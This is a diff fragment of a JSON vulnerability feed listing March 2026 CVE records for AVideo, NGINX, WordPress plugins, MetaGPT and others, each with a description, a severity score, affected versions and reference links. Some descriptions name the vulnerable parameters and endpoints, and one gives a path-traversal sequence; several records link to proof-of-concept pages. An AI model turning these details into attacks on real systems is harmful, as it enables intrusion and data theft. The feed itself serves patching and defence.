+      "description": "WWBN AVideo is an open source video platform. In versions up to and including 26.0, an unauthenticated API endpoint (`APIName=locale`) concatenates user input into an `include` path with no canonicalization or whitelist. Path traversal is accepted, so arbitrary PHP files under the web root can be included. In our test this yielded confirmed file disclosure and code execution of existing PHP content (e.g., `view/about.php`), and it *can* escalate to RCE if an attacker can place or control a PHP file elsewhere in the tree. As of time of publication, no patched versions are available.",
+      "severity": 8.6,
+      "references": [
+        {
+          "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-8fw8-q79c-fp9m",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WWBN",
+          "product": "AVideo",
+          "versions": [
+            {
+              "version": "<= 26.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+        "CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-27654",
+      "publishedDate": "2026-03-24T14:13:26.879Z",
+      "lastModifiedDate": "2026-03-24T14:32:07.177Z",
+      "description": "NGINX Open Source and NGINX Plus have a vulnerability in the ngx_http_dav_module module that might allow an attacker to trigger a buffer overflow to the NGINX worker process; this vulnerability may result in termination of the NGINX worker process or modification of source or destination file names outside the document root. This issue affects NGINX Open Source and NGINX Plus when the configuration file uses DAV module MOVE or COPY methods, prefix location (nonregular expression location configuration), and alias directives. The integrity impact is constrained because the NGINX worker process user has low privileges and does not have access to the entire system. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 8.2,
+      "references": [
+        {
+          "url": "https://my.f5.com/manage/s/article/K000160382",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "F5",
+          "product": "NGINX Open Source",
+          "modules": [
+            "ngx_http_dav_module"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "1.29.0",
+              "lessThan": "1.29.7",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0.5.13",
+              "lessThan": "1.28.3",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unknown"
+        },
+        {
+          "vendor": "F5",
+          "product": "NGINX Plus",
+          "modules": [
+            "ngx_http_dav_module"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "R36",
+              "lessThan": "R36 P3",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R35",
+              "lessThan": "R35 P2",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R34",
+              "lessThan": "*",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R33",
+              "lessThan": "*",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R32",
+              "lessThan": "R32 P5",
+              "versionType": "custom"
+            }
+          ],
+          "defaultStatus": "unknown"
+        }
+      ],
+      "problemType": [
+        "CWE-122: Heap-based Buffer Overflow"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33651",
+      "publishedDate": "2026-03-23T18:38:22.655Z",
+      "lastModifiedDate": "2026-03-24T14:26:15.593Z",
+      "description": "WWBN AVideo is an open source video platform. In versions up to and including 26.0, the `remindMe.json.php` endpoint passes `$_REQUEST['live_schedule_id']` through multiple functions without sanitization until it reaches `Scheduler_commands::getAllActiveOrToRepeat()`, which directly concatenates it into a SQL `LIKE` clause. Although intermediate functions (`new Live_schedule()`, `getUsers_idOrCompany()`) apply `intval()` internally, they do so on local copies within `ObjectYPT::getFromDb()`, leaving the original tainted variable unchanged. Any authenticated user can perform time-based blind SQL injection to extract arbitrary database contents. Commit 75d45780728294ededa1e3f842f95295d3e7d144 contains a patch.",
+      "severity": 8.1,
+      "references": [
+        {
+          "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-pvw4-p2jm-chjm",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/WWBN/AVideo/commit/75d45780728294ededa1e3f842f95295d3e7d144",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WWBN",
+          "product": "AVideo",
+          "versions": [
+            {
+              "version": "<= 26.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-32647",
+      "publishedDate": "2026-03-24T14:13:25.724Z",
+      "lastModifiedDate": "2026-03-24T14:13:25.724Z",
+      "description": "NGINX Open Source and NGINX Plus have a vulnerability in the ngx_http_mp4_module, which might allow an attacker to trigger a buffer over-read or over-write to the NGINX worker memory resulting in its termination or possibly code execution, using a specially crafted mp4 file. This issue affects NGINX Open Source and NGINX Plus if it is built with the ngx_http_mp4_module and the mp4 directive is used in the configuration file. Additionally, the attack is possible only if an attacker can trigger the processing of a specially crafted mp4 file with the ngx_http_mp4_module. \n\n\nNote: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 7.8,
+      "references": [
+        {
+          "url": "https://my.f5.com/manage/s/article/K000160366",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "defaultStatus": "unknown",
+          "modules": [
+            "ngx_http_mp4_module"
+          ],
+          "product": "NGINX Open Source",
+          "vendor": "F5",
+          "versions": [
+            {
+              "lessThan": "1.29.7",
+              "status": "affected",
+              "version": "1.29.0",
+              "versionType": "semver"
+            },
+            {
+              "lessThan": "1.28.3",
+              "status": "affected",
+              "version": "1.1.19",
+              "versionType": "semver"
+            }
+          ]
+        },
+        {
+          "defaultStatus": "unaffected",
+          "modules": [
+            "ngx_http_mp4_module"
+          ],
+          "product": "NGINX Plus",
+          "vendor": "F5",
+          "versions": [
+            {
+              "lessThan": "R36 P3",
+              "status": "affected",
+              "version": "R36",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "R35 P2",
+              "status": "affected",
+              "version": "R35",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R34",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R33",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "R32 P5",
+              "status": "affected",
+              "version": "R32",
+              "versionType": "custom"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-125 Out-of-bounds Read"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-27784",
+      "publishedDate": "2026-03-24T14:13:25.343Z",
+      "lastModifiedDate": "2026-03-24T14:36:46.530Z",
+      "description": "The 32-bit implementation of NGINX Open Source has a vulnerability in the ngx_http_mp4_module module, which might allow an attacker to over-read or over-write NGINX worker memory resulting in its termination, using a specially crafted MP4 file. The issue only affects 32-bit NGINX Open Source if it is built with the ngx_http_mp4_module module and the mp4 directive is used in the configuration file. Additionally, the attack is possible only if an attacker can trigger the processing of a specially crafted MP4 file with the ngx_http_mp4_module module. \n\n\nNote: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 7.8,
+      "references": [
+        {
+          "url": "https://my.f5.com/manage/s/article/K000160364",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "F5",
+          "product": "NGINX Open Source",
+          "modules": [
+            "ngx_http_mp4_module"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "1.29.0",
+              "lessThan": "1.29.7",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "1.1.19",
+              "lessThan": "1.28.3",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unknown"
+        }
+      ],
+      "problemType": [
+        "CWE-190 Integer Overflow or Wraparound"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33847",
+      "publishedDate": "2026-03-24T05:55:14.556Z",
+      "lastModifiedDate": "2026-03-24T14:15:58.916Z",
+      "description": "Improper Restriction of Operations within the Bounds of a Memory Buffer vulnerability in linkingvision rapidvms.This issue affects rapidvms: before PR#96.",
+      "severity": 7.8,
+      "references": [
+        {
+          "url": "https://github.com/linkingvision/rapidvms/pull/98",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "linkingvision",
+          "product": "rapidvms",
+          "collectionURL": "https://github.com/linkingvision/rapidvms",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "PR#96",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33851",
+      "publishedDate": "2026-03-24T05:48:17.002Z",
+      "lastModifiedDate": "2026-03-24T14:17:22.605Z",
+      "description": "Improper Restriction of Operations within the Bounds of a Memory Buffer vulnerability in joncampbell123 doslib.This issue affects doslib: before doslib-20250729.",
+      "severity": 7.8,
+      "references": [
+        {
+          "url": "https://github.com/joncampbell123/doslib/pull/65",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "joncampbell123",
+          "product": "doslib",
+          "collectionURL": "https://github.com/joncampbell123/doslib",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "doslib-20250729",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33850",
+      "publishedDate": "2026-03-24T05:47:02.673Z",
+      "lastModifiedDate": "2026-03-24T14:27:26.039Z",
+      "description": "Out-of-bounds Write vulnerability in WujekFoliarz DualSenseY-v2.This issue affects DualSenseY-v2: before 54.",
+      "severity": 7.8,
+      "references": [
+        {
+          "url": "https://github.com/WujekFoliarz/DualSenseY-v2/pull/66",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WujekFoliarz",
+          "product": "DualSenseY-v2",
+          "collectionURL": "https://github.com/WujekFoliarz/DualSenseY-v2",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "54",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-787 Out-of-bounds Write"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33650",
+      "publishedDate": "2026-03-23T18:28:13.324Z",
+      "lastModifiedDate": "2026-03-24T14:10:38.572Z",
+      "description": "WWBN AVideo is an open source video platform. In versions up to and including 26.0, a user with the \"Videos Moderator\" permission can escalate privileges to perform full video management operations — including ownership transfer and deletion of any video — despite the permission being documented as only allowing video publicity changes (Active, Inactive, Unlisted). The root cause is that `Permissions::canModerateVideos()` is used as an authorization gate for full video editing in `videoAddNew.json.php`, while `videoDelete.json.php` only checks ownership, creating an asymmetric authorization boundary exploitable via a two-step ownership-transfer-then-delete chain. Commit 838e16818c793779406ecbf34ebaeba9830e33f8 contains a patch.",
+      "severity": 7.6,
+      "references": [
+        {
+          "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-8x77-f38v-4m5j",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/WWBN/AVideo/commit/838e16818c793779406ecbf34ebaeba9830e33f8",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WWBN",
+          "product": "AVideo",
+          "versions": [
+            {
+              "version": "<= 26.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-863: Incorrect Authorization"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-27651",
+      "publishedDate": "2026-03-24T14:13:27.295Z",
+      "lastModifiedDate": "2026-03-24T14:22:35.756Z",
+      "description": "When the ngx_mail_auth_http_module module is enabled on NGINX Plus or NGINX Open Source, undisclosed requests can cause worker processes to terminate. This issue may occur when (1) CRAM-MD5 or APOP authentication is enabled, and (2) the authentication server permits retry by returning the Auth-Wait response header. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 7.5,
+      "references": [
+        {
+          "url": "https://my.f5.com/manage/s/article/K000160383",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "F5",
+          "product": "NGINX Open Source",
+          "modules": [
+            "ngx_mail_auth_http_module"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "1.29.0",
+              "lessThan": "1.29.7",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0.5.15",
+              "lessThan": "1.28.3",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unknown"
+        },
+        {
+          "vendor": "F5",
+          "product": "NGINX Plus",
+          "modules": [
+            "ngx_mail_auth_http_module"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "R36",
+              "lessThan": "R36 P3",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R35",
+              "lessThan": "R35 P2",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R34",
+              "lessThan": "*",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R33",
+              "lessThan": "*",
+              "versionType": "custom"
+            },
+            {
+              "status": "affected",
+              "version": "R32",
+              "lessThan": "R32 P5",
+              "versionType": "custom"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-476 NULL Pointer Dereference"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4640",
+      "publishedDate": "2026-03-24T04:20:47.070Z",
+      "lastModifiedDate": "2026-03-24T14:32:28.738Z",
+      "description": "Vitals ESP developed by Galaxy Software Services has a Missing Authentication vulnerability, allowing unauthenticated remote attackers to execute certain functions to obtain sensitive information.",
+      "severity": 7.5,
+      "references": [
+        {
+          "url": "https://www.twcert.org.tw/tw/cp-132-10794-704a2-1.html",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.twcert.org.tw/en/cp-139-10795-25784-2.html",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Galaxy Software Services",
+          "product": "Vitals ESP",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThanOrEqual": "6.3",
+              "versionType": "custom"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-306 Missing authentication for critical function"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25579",
+      "publishedDate": "2026-03-21T15:30:37.851Z",
+      "lastModifiedDate": "2026-03-24T14:23:10.480Z",
+      "description": "phpTransformer 2016.9 contains a directory traversal vulnerability that allows unauthenticated attackers to access arbitrary files by manipulating the path parameter. Attackers can send requests to the jQueryFileUploadmaster server endpoint with traversal sequences ../../../../../../ to list and retrieve files outside the intended directory.",
+      "severity": 7.5,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46192",
+          "type": "poc"
+        },
+        {
+          "url": "http://phptransformer.com/",
+          "type": "reference"
+        },
+        {
+          "url": "https://netcologne.dl.sourceforge.net/project/phptransformer/Version%202016.9/release_2016.9.zip",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/phptransformer-directory-traversal-via-jqueryfileupload",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Phptransformer",
+          "product": "phpTransformer",
+          "versions": [
+            {
+              "version": "2016.9",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4373",
+      "publishedDate": "2026-03-21T06:45:13.779Z",
+      "lastModifiedDate": "2026-03-24T14:05:24.476Z",
+      "description": "The JetFormBuilder plugin for WordPress is vulnerable to arbitrary file read via path traversal in all versions up to, and including, 3.5.6.2. This is due to the 'Uploaded_File::set_from_array' method accepting user-supplied file paths from the Media Field preset JSON payload without validating that the path belongs to the WordPress uploads directory. Combined with an insufficient same-file check in 'File_Tools::is_same_file' that only compares basenames, this makes it possible for unauthenticated attackers to exfiltrate arbitrary local files as email attachments by submitting a crafted form request when the form is configured with a Media Field and a Send Email action with file attachment.",
+      "severity": 7.5,
+      "references": [
+        {
+          "url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/1801fd3e-d56f-4540-9700-9e9de8b465e1?source=cve",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/jetformbuilder/tags/3.5.6.2/includes/classes/resources/uploaded-file.php#L99",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/jetformbuilder/tags/3.5.6.2/modules/block-parsers/file-uploader.php#L313",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/jetformbuilder/tags/3.5.6.2/modules/actions-v2/send-email/send-email-action.php#L214",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/changeset/3486996/jetformbuilder",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "jetmonsters",
+          "product": "JetFormBuilder — Dynamic Blocks Form Builder",
+          "versions": [
+            {
+              "version": "*",
+              "status": "affected",
+              "lessThanOrEqual": "3.5.6.2",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-36 Absolute Path Traversal"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4594",
+      "publishedDate": "2026-03-23T17:41:26.211Z",
+      "lastModifiedDate": "2026-03-24T14:11:24.887Z",
+      "description": "A vulnerability has been found in erupts erupt up to 1.13.3. Affected by this issue is the function geneEruptHqlOrderBy of the file erupt-data/erupt-jpa/src/main/java/xyz/erupt/jpa/dao/EruptJpaUtils.java. Such manipulation of the argument sort.field leads to sql injection hibernate. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "severity": 7.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352431",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352431",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.775594",
+          "type": "reference"
+        },
+        {
+          "url": "https://fx4tqqfvdw4.feishu.cn/docx/ETWUdbPk1oCC56xoEWHc3Q28nEc?from=from_copylink",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "erupts",
+          "product": "erupt",
+          "versions": [
+            {
+              "version": "1.13.0",
+              "status": "affected"
+            },
+            {
+              "version": "1.13.1",
+              "status": "affected"
+            },
+            {
+              "version": "1.13.2",
+              "status": "affected"
+            },
+            {
+              "version": "1.13.3",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "SQL Injection Hibernate",
+        "SQL Injection"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4540",
+      "publishedDate": "2026-03-22T07:41:05.649Z",
+      "lastModifiedDate": "2026-03-24T14:33:25.772Z",
+      "description": "A vulnerability was detected in projectworlds Online Notes Sharing System 1.0. This issue affects some unknown processing of the file /login.php of the component Parameters Handler. The manipulation of the argument User results in sql injection. The attack can be executed remotely. The exploit is now public and may be used.",
+      "severity": 7.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352357",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352357",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.774686",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/juzidddd/CVE/issues/4",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "projectworlds",
+          "product": "Online Notes Sharing System",
           "versions": [
             {
               "version": "1.0",
+              "status": "affected"
+            }
+          ],
+          "modules": [
+            "Parameters Handler"
+          ]
+        }
+      ],
+      "problemType": [
+        "SQL Injection",
+        "Injection"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25573",
+      "publishedDate": "2026-03-21T15:30:32.203Z",
+      "lastModifiedDate": "2026-03-24T14:19:15.398Z",
+      "description": "Green CMS 2.x contains an SQL injection vulnerability that allows authenticated attackers to execute arbitrary SQL queries by injecting malicious code through the cat parameter. Attackers can send GET requests to index.php with m=admin, c=posts, a=index parameters and inject SQL code in the cat parameter to manipulate database queries and extract sensitive information.",
+      "severity": 7.1,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46244",
+          "type": "poc"
+        },
+        {
+          "url": "http://www.greencms.net/",
+          "type": "reference"
+        },
+        {
+          "url": "https://codeload.github.com/GreenCMS/GreenCMS/zip/beta",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/green-cms-2-x-sql-injection-via-cat-parameter",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Greencms",
+          "product": "Green CMS",
+          "versions": [
+            {
+              "version": "2.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4545",
+      "publishedDate": "2026-03-22T11:20:57.774Z",
+      "lastModifiedDate": "2026-03-24T14:34:17.765Z",
+      "description": "A security flaw has been discovered in Flos Freeware Notepad2 4.2.25. This affects an unknown function in the library PROPSYS.dll. Performing a manipulation results in uncontrolled search path. The attack is only possible with local access. The attack is considered to have high complexity. The exploitability is reported as difficult. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "severity": 7,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352372",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352372",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.774752",
+          "type": "reference"
+        },
+        {
+          "url": "https://drive.google.com/file/d/1o3A3x47B2gi645H02-28qgoIgGN-g6rK/view",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Flos Freeware",
+          "product": "Notepad2",
+          "versions": [
+            {
+              "version": "4.2.25",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Uncontrolled Search Path",
+        "Untrusted Search Path"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4749",
+      "publishedDate": "2026-03-24T05:35:36.711Z",
+      "lastModifiedDate": "2026-03-24T14:31:56.424Z",
+      "description": "NVD-CWE-noinfo vulnerability in albfan miraclecast.This issue affects miraclecast: before v1.0.",
+      "severity": 6.5,
+      "references": [
+        {
+          "url": "https://github.com/albfan/miraclecast/pull/555",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "albfan",
+          "product": "miraclecast",
+          "collectionURL": "https://github.com/albfan/miraclecast",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "v1.0",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "NVD-CWE-noinfo NVD-CWE-noinfo"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4752",
+      "publishedDate": "2026-03-24T05:40:01.007Z",
+      "lastModifiedDate": "2026-03-24T14:28:22.730Z",
+      "description": "Use After Free vulnerability in No-Chicken Echo-Mate.This issue affects Echo-Mate: before V250329.",
+      "severity": 6.4,
+      "references": [
+        {
+          "url": "https://github.com/No-Chicken/Echo-Mate/pull/5",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "No-Chicken",
+          "product": "Echo-Mate",
+          "collectionURL": "https://github.com/No-Chicken/Echo-Mate",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "V250329",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-416 Use After Free"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-3516",
+      "publishedDate": "2026-03-20T23:25:12.779Z",
+      "lastModifiedDate": "2026-03-24T14:11:59.760Z",
+      "description": "The Contact List plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the '_cl_map_iframe' parameter in all versions up to, and including, 3.0.18. This is due to insufficient input sanitization and output escaping when handling the Google Maps iframe custom field. The saveCustomFields() function in class-contact-list-custom-fields.php uses a regex to extract <iframe> tags from user input but does not validate or sanitize the iframe's attributes, allowing event handlers like 'onload' to be included. The extracted iframe HTML is stored via update_post_meta() and later rendered on the front-end in class-cl-public-card.php without any escaping or wp_kses filtering. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.",
+      "severity": 6.4,
+      "references": [
+        {
+          "url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/a8059995-55cb-49ee-add1-f5364d0772eb?source=cve",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/trunk/public/class-cl-public-card.php#L466",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/tags/3.0.17/public/class-cl-public-card.php#L466",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/trunk/includes/class-contact-list-custom-fields.php#L697",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/tags/3.0.17/includes/class-contact-list-custom-fields.php#L697",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/trunk/includes/class-contact-list-custom-fields.php#L675",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/browser/contact-list/tags/3.0.17/includes/class-contact-list-custom-fields.php#L675",
+          "type": "reference"
+        },
+        {
+          "url": "https://plugins.trac.wordpress.org/changeset/3486445",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "anssilaitila",
+          "product": "Contact List – Online Staff Directory & Address Book",
+          "versions": [
+            {
+              "version": "*",
+              "status": "affected",
+              "lessThanOrEqual": "3.0.18",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4597",
+      "publishedDate": "2026-03-23T20:15:04.976Z",
+      "lastModifiedDate": "2026-03-24T14:03:14.744Z",
+      "description": "A security flaw has been discovered in 648540858 wvp-GB28181-pro up to 2.7.4. Impacted is the function selectAll of the file src/main/java/com/genersoft/iot/vmp/streamProxy/dao/provider/StreamProxyProvider.java of the component Stream Proxy Query Handler. The manipulation results in sql injection. The attack may be launched remotely. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way. Several companies clearly confirm that VulDB is the primary source for best vulnerability data.",
+      "severity": 6.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352435",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352435",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.775635",
+          "type": "reference"
+        },
+        {
+          "url": "https://fx4tqqfvdw4.feishu.cn/docx/MwZRdLmXhosJJFxCQ2kcJjfqnhk?from=from_copylink",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "648540858",
+          "product": "wvp-GB28181-pro",
+          "versions": [
+            {
+              "version": "2.7.0",
+              "status": "affected"
+            },
+            {
+              "version": "2.7.1",
+              "status": "affected"
+            },
+            {
+              "version": "2.7.2",
+              "status": "affected"
+            },
+            {
+              "version": "2.7.3",
+              "status": "affected"
+            },
+            {
+              "version": "2.7.4",
+              "status": "affected"
+            }
+          ],
+          "modules": [
+            "Stream Proxy Query Handler"
+          ]
+        }
+      ],
+      "problemType": [
+        "SQL Injection",
+        "Injection"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4515",
+      "publishedDate": "2026-03-21T11:32:11.396Z",
+      "lastModifiedDate": "2026-03-24T14:09:01.018Z",
+      "description": "A vulnerability has been found in Foundation Agents MetaGPT up to 0.8.1. This affects the function code_generate of the file metagpt/ext/aflow/scripts/operator.py. The manipulation leads to code injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "severity": 6.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352080",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352080",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.773929",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/Ka7arotto/cve/blob/main/metagpt-rce1.md",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Foundation Agents",
+          "product": "MetaGPT",
+          "versions": [
+            {
+              "version": "0.8.0",
+              "status": "affected"
+            },
+            {
+              "version": "0.8.1",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
